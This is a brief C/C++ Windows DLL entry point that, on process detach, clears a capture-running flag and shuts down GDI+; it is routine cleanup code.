BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning.store(false);
        shutdown_gdiplus();
    }
    return TRUE;
}
